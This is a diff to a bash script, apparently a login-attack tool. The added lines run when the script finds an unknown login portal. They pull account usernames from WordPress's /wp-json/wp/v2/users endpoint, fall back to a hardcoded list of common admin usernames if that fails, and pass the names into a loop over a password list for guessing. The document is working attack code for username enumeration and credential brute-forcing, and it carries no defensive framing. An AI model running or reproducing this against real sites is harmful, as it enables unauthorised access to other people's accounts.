@@ -109,6 +109,32 @@ for LOGIN_URL in "${POSSIBLE_LOGIN_URLS[@]}"; do
 		echo -e "[${green}x${none}] [${green}Unknown${none}] login portal found: [${yellow}${LOGIN_URL}${none}]"
 		echo ""
 		
+		# This could be WordPress, so try to fetch usernames from /wp-json/wp/v2/users
+		USERS_URL="$dnsname/wp-json/wp/v2/users"
+		response_code=$(curl -s -o /dev/null -w "%{http_code}" "$USERS_URL")
+		if [ "$response_code" == "200" ]; then
+		
+			# Jackpot! Harvest the user list.
+			echo -e " Harvesting username list from [${yellow}/wp-json/wp/v2/users${none}]..."
+			wordpressusernames=$(curl -s "$USERS_URL" | jq -r '.[].slug')
+			wordpressusernames=($wordpressusernames)
+			wordpressusernames_length=${#wordpressusernames[@]}
+			
+			echo -e " Found ${white}[${none}$wordpressusernames_length${white}]${none} usernames:"
+			for username in "${wordpressusernames[@]}"; do
+				echo -e " - [${green}$username${none}]"
+			done
+			echo ""
+		
+		else
+		
+			# Just use some common default web logins.
+			echo -e " Could not access [${yellow}/wp-json/wp/v2/users${none}], using some [common usernames] instead..."
+			wordpressusernames=("adm" "admin" "admin1" "manager" "root" "support" "sysadmin" "test" "user" "wordpress" "wp" "wp-admin" "wpadmin")
+			wordpressusernames_length=${#wordpressusernames[@]}
+		
+		fi
+		
 		# For each password...
 		counter=0
 		for pass in "${passwords[@]}"; do
